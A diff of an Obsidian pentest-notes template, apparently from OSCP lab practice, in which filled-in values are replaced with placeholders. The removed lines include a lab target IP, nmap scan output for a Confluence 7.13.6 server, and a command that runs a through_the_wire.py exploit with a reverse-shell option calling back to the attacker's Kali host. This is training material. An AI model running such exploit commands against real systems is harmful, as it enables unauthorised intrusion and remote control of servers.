@@ -1,4 +1,4 @@
-IP::   192.168.138.41
+IP::   IP
 
 | Machine | IP Address | Notes |
 | ------- | ---------- | ----- |
@@ -11,7 +11,7 @@ const command = `${ip}`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
-KALI IP::  192.168.45.232
+KALI IP::  KALIIP
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
@@ -27,9 +27,7 @@ const command = `http://${ip}/`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
-Discovered Web Domain::   192.168.138.41
-
-http://192.168.138.41:8090/login.action
+Discovered Web Domain::   EXAMPLECOM
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Notes");
 const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
@@ -52,7 +50,7 @@ dv.paragraph("```bash\n" + command + "\n```");
 ---
 
 ```
-python3 through_the_wire.py --rhost 192.168.138.41 --rport 8090 --lhost 192.168.45.232 --protocol http:// --reverse-shell
+
 ```
 
 ```
@@ -63,7 +61,7 @@ python3 through_the_wire.py --rhost 192.168.138.41 --rport 8090 --lhost 192.168.
 ## Software Versions
 
 
-Atlassian Confluence 7.13.6
+
 
 
 
@@ -74,15 +72,6 @@ Atlassian Confluence 7.13.6
 
 ## Open Ports
 ---
-PORT     STATE SERVICE  VERSION                                                                                     
-22/tcp   open  ssh      OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)                                
-| ssh-hostkey:                                                                                                                                                    
-8090/tcp open  http     Apache Tomcat (language: en)                                                                
-| http-title: Log In - Confluence                                                                                   
-|_Requested resource was /login.action?               
-8091/tcp open  jamlink?                                                                                                                                        
-|     Server: Aleph/0.4.6                                                                                           
-
 
 | Port | Service | Notes |
 | ---- | ------- | ----- |
